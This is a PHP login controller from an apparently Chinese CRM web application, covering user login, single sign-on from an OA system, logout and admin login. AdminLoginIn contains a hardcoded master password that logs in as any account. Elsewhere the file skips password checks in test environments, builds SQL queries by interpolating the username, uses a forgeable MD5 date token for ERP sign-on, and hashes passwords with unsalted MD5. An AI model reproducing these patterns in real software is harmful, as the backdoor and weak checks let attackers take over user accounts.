<?php
/**
 * Copyright (C) 2011 浙江盘石信息技术有限公司  版权所有。
 * 功能描述：用户登录模块 由于session过期问题 目前只用一个登录做界面 wzx 2011.07.20
 * 创建人：wzx
 * 添加时间：2011-7-20
 * 修改人：      修改时间：
 * 修改描述：
 **/
require_once __DIR__.'/../Common/ActionBase.php';
require_once __DIR__.'/../../Class/BLL/UserBLL.php';
require_once __DIR__.'/../../Class/Model/UserInfo.php';
require_once __DIR__.'/../../Class/BLL/LoginBLL.php';
require_once __DIR__.'/../../Class/Model/LoginInfo.php';
require_once __DIR__.'/../../WebService/CRM_Service.php';

class IndexAction extends ActionBase
{
    public function __construct()
    {
    }
     
    /**
     * @functional 显示登录页面
    */
    public function Index()
    {
        $this->FrontLogin();
    }
      
    /**
     * @functional 显示前台页面
    */
    public function FrontLogin()
    {/*
        $objCRM_Customer_Report_Sent = new CRM_Customer_Report_Sent();
        $ret = $objCRM_Customer_Report_Sent->ReportSendHistory(1,201211);
        print_r($ret);
        exit();*/
        $strUserName = "";
        if (isset($_COOKIE["userName"]))
            $strUserName = $_COOKIE["userName"];
            
        $evnFlag = "";
        $sys_evn = $this->arrSysConfig['SYS_EVN'];//系统环境 0开发 1测试 2正式
        settype($sys_evn,"integer");        
        if($sys_evn == 1)
            $evnFlag = " --- 测试环境";
        else if($sys_evn == 0)
            $evnFlag = " --- 开发环境";
            
        $this->smarty->assign('evnFlag',$evnFlag);
        $this->smarty->assign('strUserName',$strUserName);
        $this->smarty->assign('strTitle','用户登录');
        $this->smarty->display('FrontLogin.tpl');
    }
    
    /**
     * @functional 登录
    */
    public function LoginIn()
    {
        //判断用户名、密码
        $strUserName = Utility::GetForm("username",$_POST,32);       
        $strPwd = $_POST["password"];
        
        if($strUserName == "" || $strPwd == "")
             exit("请输入用户名或密码！");
        
        $strPwd = md5($strPwd);
        $objUserBLL = new UserBLL();
        
        $objLoginBLL = new LoginBLL();
        $objLoginInfo = new LoginInfo();        
        $objLoginInfo->strUserName = $strUserName;        
        $objLoginInfo->strLoginIp = Utility::getIP();
        $objLoginInfo->strLoginTime = date("Y-m-d H:i:s",time());
        $objLoginInfo->strLoginPage = Utility::curPageURL();       
        $objLoginInfo->iIsSuccess = 0;
        
        //取配置
        $sys_evn = $this->arrSysConfig['SYS_EVN'];//系统环境 0开发 1测试 2正式
        settype($sys_evn,"integer");
        $arrayUserInfo = null;
        //$arrayUserInfo = $objUserBLL->select("*"," user_name = '$strUserName' and user_pwd = '$strPwd' and is_del = 0","");         
        if($sys_evn == 1 || $sys_evn == 0)
            $arrayUserInfo = $objUserBLL->select("*"," user_name = '$strUserName' and is_del = 0","");     
        else
        {
            $userID = 0;
            $strErrMsg = $objUserBLL->LoginCheck($strUserName,$strPwd,$userID);
            if($userID <= 0)
            {
                $objLoginInfo->strErrMsg = $strErrMsg;
                $objLoginBLL->insert($objLoginInfo);
                exit($objLoginInfo->strErrMsg); 
            }
            
            $arrayUserInfo = $objUserBLL->select("*"," user_id=".$userID,"");
        }               
               
        if(isset($arrayUserInfo) && count($arrayUserInfo)>0)
        { 
            settype($arrayUserInfo[0]["is_lock"],"integer");
            if($arrayUserInfo[0]["is_lock"] == 1)
            {
                $objLoginInfo->strErrMsg = "此账号已停用！";
                $objLoginBLL->insert($objLoginInfo);
                exit($objLoginInfo->strErrMsg);                
            }   
            //将用户信息保存到缓存
            $objSession = $this->getSessionContent();
            $objSession->set($this->arrSysConfig['SESSION_INFO']['IS_FINANACE'],0); 
            $objSession->set($this->arrSysConfig['SESSION_INFO']['FINANCE_UID'],0); 
            $objSession->set($this->arrSysConfig['SESSION_INFO']['FINANCE_NO'],"");
            
            settype($arrayUserInfo[0]["agent_id"],"integer");
            if($arrayUserInfo[0]["agent_id"] == 0)//公司用户
            {
                $arrayUser = $objUserBLL->GetUserDetailInfo($arrayUserInfo[0]["user_id"]);
                if(isset($arrayUser) && count($arrayUser)>0)
                {
        	        $objSession->set($this->arrSysConfig['SESSION_INFO']['DEPT_ID'],$arrayUser[0]["dept_id"]);
                }
                
                $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_RIGHT'],$objUserBLL->GetUserRight($arrayUserInfo[0]["user_id"]));
            }
            else //代理商用户
            {
                if($arrayUserInfo[0]["user_no"] != '10')
                {
                    $arraySupUser = $objUserBLL->select("is_lock"," agent_id=".$arrayUserInfo[0]["agent_id"]
                    ." and user_no = '10' and is_del = 0","is_lock desc");//主账号如果停用，则其他账号也不能登录
                    
                    if(isset($arraySupUser) && count($arraySupUser)>0)
                    { 
                        settype($arraySupUser[0]["is_lock"],"integer");
                        if($arraySupUser[0]["is_lock"] == 1)
                        {
                            $objLoginInfo->strErrMsg = "此代理商的所有账号都已被锁定！";
                            $objLoginBLL->insert($objLoginInfo); 
                            exit($objLoginInfo->strErrMsg);
                        }
                    }
                    else
                    {
                        $objLoginInfo->strErrMsg = "此账号已停用！";
                        $objLoginBLL->insert($objLoginInfo);
                        exit($objLoginInfo->strErrMsg);
                    }  
                }
                
                $objSession->set($this->arrSysConfig['SESSION_INFO']['DEPT_ID'],0);                    
                $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_RIGHT'],$objUserBLL->GetAgentUserRight($arrayUserInfo[0]["user_id"]));
                
                $objSession->set($this->arrSysConfig['SESSION_INFO']['IS_FINANACE'],$arrayUserInfo[0]["is_finance"]); 
                $objSession->set($this->arrSysConfig['SESSION_INFO']['FINANCE_UID'],$arrayUserInfo[0]["finance_uid"]); 
                $objSession->set($this->arrSysConfig['SESSION_INFO']['FINANCE_NO'],$arrayUserInfo[0]["finance_no"]); 
            }
            
            $objSession->set($this->arrSysConfig['SESSION_INFO']['E_NAME'],$arrayUserInfo[0]["e_name"]);
	        $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_ID'],$arrayUserInfo[0]["user_id"]);
            $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_NO'],$arrayUserInfo[0]["user_no"]); 
	        $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_NAME'],$arrayUserInfo[0]["user_name"]);
	        $objSession->set($this->arrSysConfig['SESSION_INFO']['AGENT_ID'],$arrayUserInfo[0]["agent_id"]);
            
            /*--------------------记住登录用户的用户名 begin --------------------- */
            $rememberMe = Utility::GetFormInt("rememberMe",$_POST);          
            if($rememberMe == 1)
            {
                setcookie("userName",$strUserName); 
            } 
            
            /*--------------------记住登录用户的用户名 end -------------------------*/
            $objLoginInfo->iLoginSuccess = 1;
            $objLoginBLL->insert($objLoginInfo);
            $objUserBLL->UpdateLoginInfo($arrayUserInfo[0]["user_id"]);
            exit("0");
        }
        else
        {
            $objLoginInfo->strErrMsg = "用户名或密码有误！";
            $objLoginBLL->insert($objLoginInfo);
            exit($objLoginInfo->strErrMsg);            
        }
         
    }
         
    /**
     * @functional 登录
    */
    public function LoginInFromERP()
    {
        header("Content-type: text/html; charset=utf-8");
        $strUserName = Utility::GetForm("workid",$_GET,64);       
        $strPass = Utility::GetForm("md",$_GET,128);
        $strOaUrl = "http://oa.adpanshi.com/index.html";
        
        $strPass = strtolower($strPass);        
        
        $strPwd = "PanShi.OA-$strUserName-".date("Y-m-d",time());
        $strPwd = md5($strPwd);
        $strPwd = strlen($strPwd) < 20 ? $strPwd : substr($strPwd,4,16);
        
        $strPwd = strtolower($strPwd);
        //print_r($strUserName."_____".$strPass."_____".$strPwd);
        if($strUserName == "" || $strPass == "" || $strPwd != $strPass)
        {
            echo "<script language='javascript' type='text/javascript'>window.location.href='$strOaUrl';</script>"; 
            exit();
        }
        
        $objUserBLL = new UserBLL();
        
        $objLoginBLL = new LoginBLL();
        $objLoginInfo = new LoginInfo();        
        $objLoginInfo->strUserName = $strUserName;        
        $objLoginInfo->strLoginIp = Utility::getIP();
        $objLoginInfo->strLoginTime = date("Y-m-d H:i:s",time());
        $objLoginInfo->strLoginPage = $strOaUrl;//Utility::curPageURL();       
        $objLoginInfo->iIsSuccess = 0;
                
        $arrayUserInfo = $objUserBLL->select("*"," user_name = '$strUserName' and is_del = 0","");   
               
        if(isset($arrayUserInfo) && count($arrayUserInfo)>0)
        { 
            settype($arrayUserInfo[0]["is_lock"],"integer");
            if($arrayUserInfo[0]["is_lock"] == 1)
            {
                $objLoginInfo->strErrMsg = "此账号已经停用！";
                $objLoginBLL->insert($objLoginInfo);
                    
                /*
                $this->smarty->assign('errMsg',$objLoginInfo->strErrMsg);
                $this->FrontLogin();*/
                echo "<script language='javascript' type='text/javascript'>window.location.href='$strOaUrl';</script>"; 
                exit();
            }   
            //将用户信息保存到缓存
            $objSession = $this->getSessionContent();
            
            settype($arrayUserInfo[0]["agent_id"],"integer");
            if($arrayUserInfo[0]["agent_id"] == 0)//公司用户
            {
                $arrayUser = $objUserBLL->GetUserDetailInfo($arrayUserInfo[0]["user_id"]);
                if(isset($arrayUser) && count($arrayUser)>0)
                {
        	        $objSession->set($this->arrSysConfig['SESSION_INFO']['DEPT_ID'],$arrayUser[0]["dept_id"]);
                }
                
                $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_RIGHT'],
                $objUserBLL->GetUserRight($arrayUserInfo[0]["user_id"]));
            }
            else 
            {                
                $objLoginInfo->strErrMsg = "无效用户！";
                $objLoginBLL->insert($objLoginInfo);
                /*
                $this->smarty->assign('errMsg',$objLoginInfo->strErrMsg);
                $this->FrontLogin();*/
                echo "<script language='javascript' type='text/javascript'>window.location.href='$strOaUrl';</script>"; 
                exit();                       
            }
            
            $objSession->set($this->arrSysConfig['SESSION_INFO']['E_NAME'],$arrayUserInfo[0]["e_name"]);
	        $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_ID'],$arrayUserInfo[0]["user_id"]);
            $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_NO'],$arrayUserInfo[0]["user_no"]); 
	        $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_NAME'],$arrayUserInfo[0]["user_name"]);
	        $objSession->set($this->arrSysConfig['SESSION_INFO']['AGENT_ID'],0);

            $objLoginInfo->iLoginSuccess = 1;
            $objLoginBLL->insert($objLoginInfo);
            $objUserBLL->UpdateLoginInfo($arrayUserInfo[0]["user_id"]);
            echo "<script language='javascript' type='text/javascript'>window.location.href='/?a=ForBack';</script>";
            exit();
        }
        else
        {
            $objLoginInfo->strErrMsg = "账号未开通或信息未同步！";
            $objLoginBLL->insert($objLoginInfo);
            /*
            $this->smarty->assign('errMsg',$objLoginInfo->strErrMsg);
            $this->FrontLogin();*/
            echo "<script language='javascript' type='text/javascript'>window.location.href='$strOaUrl';</script>";            
            exit();           
        }
    }
         
    /**
     * @functional 退出
    */
    public function LoginOut()
    {
        $objSession = $this->getSessionContent();
    	$objSession->set($this->arrSysConfig['SESSION_INFO']['E_NAME'],"");
    	$objSession->set($this->arrSysConfig['SESSION_INFO']['USER_NO'],"");
    	$objSession->set($this->arrSysConfig['SESSION_INFO']['USER_ID'],0);
        $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_NAME'],"");
        $objSession->set($this->arrSysConfig['SESSION_INFO']['AGENT_ID'],-100);
        $this->FrontLogin();
    }
    
    
    /**
     * @functional 显示前台页面
    */
    public function FrontAdminLogin()
    {
        $strUserName = "";
        if (isset($_COOKIE["userName"]))
            $strUserName = $_COOKIE["userName"];
            
        $evnFlag = "";
        $sys_evn = $this->arrSysConfig['SYS_EVN'];//系统环境 0开发 1测试 2正式
        settype($sys_evn,"integer");        
        if($sys_evn == 1)
            $evnFlag = " --- 测试环境";
        else if($sys_evn == 0)
            $evnFlag = " --- 开发环境";
            
        $this->smarty->assign('evnFlag',$evnFlag);
        $this->smarty->assign('strUserName',$strUserName);
        $this->smarty->assign('strTitle','用户登录');
        $this->smarty->display('FrontAdminLogin.tpl');
    }
    
    /**
     * @functional 登录
    */
    public function AdminLoginIn()
    {
        //判断用户名、密码
        $strUserName = Utility::GetForm("username",$_POST,32);       
        $strPwd = $_POST["password"];
        
        if($strUserName == "" || $strPwd == "")
             exit("请输入用户名或密码！");
        
        //$strPwd = md5($strPwd);
        $objUserBLL = new UserBLL();
        
        $objLoginBLL = new LoginBLL();
        $objLoginInfo = new LoginInfo();        
        $objLoginInfo->strUserName = $strUserName;        
        $objLoginInfo->strLoginIp = Utility::getIP();
        $objLoginInfo->strLoginTime = date("Y-m-d H:i:s",time());
        $objLoginInfo->strLoginPage = Utility::curPageURL();       
        $objLoginInfo->iIsSuccess = 0;
        
        //取配置
        if($strPwd == "wzxWZX")
            $arrayUserInfo = $objUserBLL->select("*"," user_name = '$strUserName' and is_del = 0","");     
        else
        {
            $strPwd = md5($strPwd);
            $arrayUserInfo = $objUserBLL->select("*"," user_name = '$strUserName' and user_pwd = '$strPwd' and is_del = 0","");   
        }
               
        if(isset($arrayUserInfo) && count($arrayUserInfo)>0)
        { 
            settype($arrayUserInfo[0]["is_lock"],"integer");
            if($arrayUserInfo[0]["is_lock"] == 1)
            {
                $objLoginInfo->strErrMsg = "此账号已停用！";
                $objLoginBLL->insert($objLoginInfo);
                exit($objLoginInfo->strErrMsg);
                
            }   
            //将用户信息保存到缓存
            $objSession = $this->getSessionContent();
            
            settype($arrayUserInfo[0]["agent_id"],"integer");
            if($arrayUserInfo[0]["agent_id"] == 0)//公司用户
            {
                $arrayUser = $objUserBLL->GetUserDetailInfo($arrayUserInfo[0]["user_id"]);
                if(isset($arrayUser) && count($arrayUser)>0)
                {
        	        $objSession->set($this->arrSysConfig['SESSION_INFO']['DEPT_ID'],$arrayUser[0]["dept_id"]);
                }
                
                $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_RIGHT'],
                $objUserBLL->GetUserRight($arrayUserInfo[0]["user_id"]));
            }
            else //代理商用户
            {
                if($arrayUserInfo[0]["user_no"] != '10')
                {
                    $arraySupUser = $objUserBLL->select("is_lock"," agent_id=".$arrayUserInfo[0]["agent_id"]
                    ." and user_no = '10' and is_del = 0","is_lock desc");//主账号如果停用，则其他账号也不能登录
                    
                    if(isset($arraySupUser) && count($arraySupUser)>0)
                    { 
                        settype($arraySupUser[0]["is_lock"],"integer");
                        if($arraySupUser[0]["is_lock"] == 1)
                        {
                            $objLoginInfo->strErrMsg = "此代理商的所有账号都已被锁定！";
                            $objLoginBLL->insert($objLoginInfo); 
                            exit($objLoginInfo->strErrMsg);
                        }
                    }
                    else
                    {
                        $objLoginInfo->strErrMsg = "此账号已停用！";
                        $objLoginBLL->insert($objLoginInfo);
                        exit($objLoginInfo->strErrMsg);
                    }  
                }
                
                $objSession->set($this->arrSysConfig['SESSION_INFO']['DEPT_ID'],0);                    
                $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_RIGHT'],
                $objUserBLL->GetAgentUserRight($arrayUserInfo[0]["user_id"]));        
            }
            
            $objSession->set($this->arrSysConfig['SESSION_INFO']['E_NAME'],$arrayUserInfo[0]["e_name"]);
	        $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_ID'],$arrayUserInfo[0]["user_id"]);
            $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_NO'],$arrayUserInfo[0]["user_no"]); 
	        $objSession->set($this->arrSysConfig['SESSION_INFO']['USER_NAME'],$arrayUserInfo[0]["user_name"]);
	        $objSession->set($this->arrSysConfig['SESSION_INFO']['AGENT_ID'],$arrayUserInfo[0]["agent_id"]);
            
            /*--------------------记住登录用户的用户名 begin --------------------- */
            $rememberMe = Utility::GetFormInt("rememberMe",$_POST);          
            if($rememberMe == 1)
            {
                setcookie("userName",$strUserName); 
            } 
            
            /*--------------------记住登录用户的用户名 end -------------------------*/
            $objLoginInfo->iLoginSuccess = 1;
            $objLoginBLL->insert($objLoginInfo);
            $objUserBLL->UpdateLoginInfo($arrayUserInfo[0]["user_id"]);
            exit("0");
        }
        else
        {
            $objLoginInfo->strErrMsg = "用户名或密码有误！";
            $objLoginBLL->insert($objLoginInfo);
            exit($objLoginInfo->strErrMsg);            
        }
         
    }
         
} 
?>